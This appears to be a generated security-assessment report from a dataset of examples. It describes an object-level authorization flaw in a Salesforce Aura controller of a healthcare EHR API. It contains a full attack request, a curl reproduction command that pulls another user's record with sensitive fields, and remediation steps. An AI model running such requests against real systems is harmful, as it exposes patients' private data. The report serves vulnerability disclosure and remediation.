# Security Analysis Report
**System:** PatientCore EHR API (Salesforce-Integrated)
**Domain:** Healthcare / EHR
**Example ID:** SF-0051
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | BOLA — Pattern 1.12 | Mass assignment via object fields on `QuoteController.getQuoteDetails` — attacker reads any EHR Quote record with all sensitive fields |

---

## Finding 1 — BOLA: Mass Assignment via Object Fields on Quote Object (Pattern 1.12)

### Summary
The Apex controller `QuoteController` on PatientCore EHR API (`b5a55efd.lightning.force.com`) is declared `without sharing`, bypassing OWD=Private on the Quote object. Per §5.0 Pattern 1.12, the client-supplied `fields` array enables mass field assignment — the attacker requests all sensitive fields (`SensitiveData__c`, `InternalNotes__c`) for Quote `0015EFD` owned by another user. In a healthcare EHR context, Quote records may represent treatment cost estimates, insurance pre-authorization records, and patient PII.

**Pattern:** 1.12 — Mass assignment via object fields (BOLA)
**Affected controller:** `c.QuoteController.getQuoteDetails`
**Affected endpoint:** `POST https://b5a55efd.lightning.force.com/aura`

### Evidence from HAR (§6.0)

**Request — Attack**
```
POST https://b5a55efd.lightning.force.com/aura
Authorization: Bearer 00DB5A55EFD!ARb5a55efd...
Content-Type: application/x-www-form-urlencoded
X-SFDC-Session: 00DB5A55EFD!ARb5a55efd...

message={"actions":[{"id":"1;a","descriptor":"c.QuoteController.getQuoteDetails","callingDescriptor":"UNKNOWN",
"params":{"quoteId":"0015EFD","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}
&aura.token=undefined
```

**Response — Victim EHR Quote Record Returned**
```json
{
  "actions": [{ "id": "1;a", "state": "SUCCESS", "returnValue": { "records": [{
    "Id": "0015EFD", "Name": "Victim Quote Record", "OwnerId": "005VICTIM",
    "InternalNotes__c": "CONFIDENTIAL: internal review notes",
    "SensitiveData__c": "SSN: 000-50-7258"
  }] }, "error": [] }]
}
```

### Steps to Reproduce
```bash
SESSION="00DB5A55EFD!ARb5a55efd..."
curl -s -X POST "https://b5a55efd.lightning.force.com/aura" \
  -H "Authorization: Bearer $SESSION" -H "Content-Type: application/x-www-form-urlencoded" -H "X-SFDC-Session: $SESSION" \
  --data-urlencode 'message={"actions":[{"id":"1;a","descriptor":"c.QuoteController.getQuoteDetails","callingDescriptor":"UNKNOWN","params":{"quoteId":"0015EFD","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}' \
  --data-urlencode 'aura.token=undefined'
# Vulnerable: state: SUCCESS, OwnerId: 005VICTIM, SensitiveData__c: SSN: 000-50-7258
# Secure: state: ERROR — INSUFFICIENT_ACCESS
```

### Remediation
1. `public with sharing class QuoteController { ... }`
2. `WHERE Id = :quoteId AND OwnerId = :UserInfo.getUserId()` + `WITH SECURITY_ENFORCED`
3. Server-side `fields` allowlist. Validate `aura.token`.
4. **Healthcare note:** Quote/pre-authorization SSN exposure (`000-50-7258`) is a direct HIPAA PHI breach.
